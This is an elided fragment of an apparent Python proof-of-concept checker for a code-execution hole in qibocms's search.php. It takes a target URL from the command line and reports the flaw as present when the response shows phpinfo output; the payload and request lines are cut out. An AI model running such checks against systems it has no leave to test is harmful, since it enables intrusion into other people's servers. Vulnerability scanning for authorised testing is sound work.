...
class qibocms_search_code_exec:
    ...
    def run(self):
        ...
        try:
            ...
            if r"Configuration File (php.ini) Path" in req.text:
                printGreen("[+]Success:存在qibo分类系统search.php 代码执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4))
            else:
                printBlue("[-]Info:不存在qibocms_search_code_exec漏洞")
...
if __name__ == "__main__":
    ...
    testVuln = qibocms_search_code_exec(sys.argv[1])
    testVuln.run()